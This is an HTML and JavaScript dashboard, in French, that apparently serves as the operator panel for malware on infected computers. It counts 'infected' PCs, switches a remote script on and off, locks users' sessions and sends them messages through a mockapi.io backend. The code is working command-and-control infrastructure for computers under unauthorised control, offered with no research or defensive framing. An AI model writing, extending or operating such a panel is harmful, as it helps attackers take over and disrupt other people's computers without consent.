<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gestion Avancée</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background-color: #f4f6f8; /* Gris très clair */
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            min-height: 100vh;
        }
        .sidebar {
            background-color: #343a40; /* Gris foncé */
            color: white;
            width: 220px;
            padding-top: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .sidebar-logo {
            margin-bottom: 30px;
            font-size: 1.5em;
            font-weight: bold;
        }
        .sidebar-nav {
            width: 100%;
        }
        .sidebar-nav a {
            display: block;
            padding: 15px 20px;
            color: #adb5bd; /* Gris clair */
            text-decoration: none;
            transition: background-color 0.3s ease;
        }
        .sidebar-nav a:hover {
            background-color: #495057; /* Gris moyen */
            color: white;
        }
        .sidebar-nav a.active {
            background-color: #007bff; /* Bleu primaire */
            color: white;
        }
        .content {
            flex-grow: 1;
            padding: 30px;
        }
        .section-title {
            color: #333;
            margin-bottom: 20px;
            font-size: 2em;
            font-weight: bold;
        }
        .data-item {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
            margin-bottom: 20px;
            border-left: 5px solid #007bff; /* Indicateur visuel */
        }
        .data-item h4 {
            color: #555;
            margin-bottom: 10px;
        }
        .action-button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .action-button:hover {
            background-color: #0056b3;
        }
        .status-indicator {
            font-weight: bold;
        }
        .status-indicator.actif {
            color: #28a745;
        }
        .status-indicator.inactif {
            color: #dc3545;
        }
        .message-form {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
        }
        .form-label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #333;
        }
        .form-control {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .message-feedback {
            margin-top: 10px;
            font-weight: bold;
        }
        .message-feedback.success {
            color: #28a745;
        }
        .message-feedback.error {
            color: #dc3545;
        }
        .refresh-button {
            background: none;
            border: none;
            padding: 0;
            margin-left: 10px;
            cursor: pointer;
        }
        .refresh-button svg {
            fill: #6c757d;
            width: 20px;
            height: 20px;
            transition: transform 0.5s ease-in-out;
        }
        .refresh-button.loading svg {
            animation: rotate 1s linear infinite;
        }
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="sidebar">
        <div class="sidebar-logo">
            <i class="fas fa-shield-alt me-2"></i> Gestion
        </div>
        <nav class="sidebar-nav">
            <a href="#" class="active"><i class="fas fa-tachometer-alt me-2"></i> Tableau de Bord</a>
            <!-- <a href="#"><i class="fas fa-desktop me-2"></i> Ordinateurs</a>
            <a href="#"><i class="fas fa-envelope me-2"></i> Messages</a>
            <a href="#"><i class="fas fa-cog me-2"></i> Paramètres</a> -->
        </nav>
    </div>
    <div class="content">
        <h2 class="section-title">Aperçu du Système</h2>

        <div class="data-item">
            <h4><i class="fas fa-desktop me-2"></i> État des Ordinateurs</h4>
            <p>Nombre d'ordinateurs sous contrôle : <span id="spaNbPcInfect" class="fw-bold">-</span>
                <button id="btnRefresh" class="refresh-button" title="Rafraîchir">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill="currentColor">
                        <path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2z"/>
                        <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466"/>
                    </svg>
                </button>
            </p>
        </div>

        <div class="data-item">
            <h4><i class="fas fa-power-off me-2"></i> Contrôle du Script</h4>
            <p>État actuel du script : <span id="SpaIsActive" class="fw-bold status-indicator">...</span></p>
            <button id="btnIsActive" class="action-button">
                <i class="fas fa-power-off me-2"></i> Changer l'état
            </button>
        </div>
		
		<div class="data-item">
			<h4><i class="fas fa-lock me-2"></i> Verrouiller la Session</h4>
			<button id="btnLockSession" class="action-button">
				<i class="fas fa-lock me-2"></i> Verrouiller
			</button>
		</div>

        <div class="message-form">
            <h4><i class="fas fa-envelope me-2"></i> Envoyer un Message</h4>
            <form id="messageForm">
                <label for="messageInput" class="form-label">Votre message :</label>
                <textarea class="form-control" id="messageInput" rows="4" required></textarea>
                <button type="submit" class="action-button mt-2">
                    <i class="fas fa-paper-plane me-2"></i> Envoyer
                </button>
                <div id="messageFeedback" class="message-feedback mt-2" style="display: none;"></div>
            </form>
        </div>
    </div>

    <script>
        const btnIsActive = document.getElementById('btnIsActive');
        const SpaIsActive = document.getElementById('SpaIsActive');
        const form = document.getElementById('messageForm');
        const messageInput = document.getElementById('messageInput');
        const messageFeedback = document.getElementById('messageFeedback');
        const btnRefresh = document.getElementById('btnRefresh');
        const SpaNbPcInfect = document.getElementById('spaNbPcInfect');
        const loadingIcon = document.getElementById('loadingIcon');
		const btnLockSession = document.getElementById('btnLockSession')
        const timeToWait = 10000;
        const url = 'https://68138d49129f6313e211a66e.mockapi.io/management/1';
        let isActive;
        let messageIncr;
        let nbPcInfectIncr;
        let nbLockSession;

        initialize();

        btnIsActive.addEventListener('click', function () {
            isActive = !isActive;
            SpaIsActive.innerText = isActive ? 'Actif' : 'Inactif';
            SpaIsActive.className = isActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
            btnIsActive.disabled = true;
            const originalText = btnIsActive.innerHTML;
            btnIsActive.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Chargement...`;

            setTimeout(() => {
                btnIsActive.disabled = false;
                btnIsActive.innerHTML = originalText;
            }, timeToWait);

            fetch(url, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ isActive: isActive })
            }).catch(error => {
                console.error('Erreur lors de la mise à jour:', error);
                btnIsActive.disabled = false;
                btnIsActive.innerHTML = originalText;
            });
        });

        form.addEventListener('submit', function (e) {
            e.preventDefault();

            const messageText = messageInput.value;
            const submitButton = form.querySelector('button[type="submit"]');
            const originalText = submitButton.innerHTML;

            submitButton.disabled = true;
            submitButton.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Envoi...`;

            setTimeout(() => {
                submitButton.disabled = false;
                submitButton.innerHTML = originalText;
            }, timeToWait);

            fetch(url, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    message: {
                        message: messageText,
                        incr: messageIncr + 1
                    }
                })
            })
            .then(() => {
                messageInput.value = '';
                messageIncr += 1;
                messageFeedback.className = 'message-feedback success';
                messageFeedback.innerText = 'Message envoyé avec succès !';
                messageFeedback.style.display = 'block';
                setTimeout(() => {
                    messageFeedback.style.display = 'none';
                }, 3000);
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi du message:', error);
                submitButton.disabled = false;
                submitButton.innerHTML = originalText;
                messageFeedback.className = 'message-feedback error';
                messageFeedback.innerText = 'Erreur lors de l’envoi du message.';
                messageFeedback.style.display = 'block';
            });
        });

        btnRefresh.addEventListener('click', function () {
            btnRefresh.disabled = true;

            const originalText = btnRefresh.innerHTML;
            let secondsLeft = 10;
            btnRefresh.innerText = `Attendez ${secondsLeft}s`;

            const countdown = setInterval(() => {
                secondsLeft--;
                btnRefresh.innerText = `Attendez ${secondsLeft}s`;

                if (secondsLeft <= 0) {
                    clearInterval(countdown);
                    btnRefresh.disabled = false;
                    btnRefresh.innerHTML = originalText;

                    fetch(url)
                        .then(response => response.json())
                        .then(data => {
                            nbPcInfectIncr = data.nbPcInfect.nbPcInfectIncr;
                            SpaNbPcInfect.innerText = data.nbPcInfect.nbPcInfect;
                        })
                        .catch(error => {
                            console.error('Erreur lors de la récupération des données:', error);
                        });
                }
            }, 1000);

            fetch(url, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    nbPcInfect: {
                        nbPcInfect: 0,
                        nbPcInfectIncr: nbPcInfectIncr + 1
                    }
                })
            })
            .catch(error => {
                console.error('Erreur lors de la mise à jour des données:', error);
                clearInterval(countdown);
                btnRefresh.disabled = false;
                btnRefresh.innerText = originalText;
            });
        });

        btnLockSession.addEventListener('click', function () {
			btnLockSession.disabled = true;
			const originalText = btnLockSession.innerHTML;
			btnLockSession.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Verrouillage...`;
            nbLockSession += 1

            fetch(url, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    nbLockSession: nbLockSession
                })
            })
            .catch(error => {
                console.error('Erreur lors de la mise à jour des données:', error);
            });
				let secondsLeft = 10
                const countdown = setInterval(() => {
                    secondsLeft--;
                    btnLockSession.innerText = `Attendez ${secondsLeft}s`;

                    if (secondsLeft <= 0) {
                        clearInterval(countdown);
                        btnLockSession.disabled = false;
                        btnLockSession.innerHTML = originalText;
                    }
                }, 1000);
        });

        function initialize() {
            fetch(url)
                .then(response => response.json())
                .then(data => {
                    isActive = data.isActive;
                    SpaIsActive.innerText = isActive ? 'Actif' : 'Inactif';
                    SpaIsActive.className = isActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
                    SpaNbPcInfect.innerText = data.nbPcInfect ? data.nbPcInfect.nbPcInfect : '-';
                    nbPcInfectIncr = data.nbPcInfect ? data.nbPcInfect.nbPcInfectIncr : 0;
                    messageIncr = data.message ? data.message.incr : 0;
                    nbLockSession = data.nbLockSession;
                })
                .catch(error => {
                    console.error('Erreur lors de l\'initialisation:', error);
                    SpaIsActive.innerText = 'Erreur';
                    SpaIsActive.className = 'fw-bold text-warning';
                });
        }
    </script>

</body>
</html>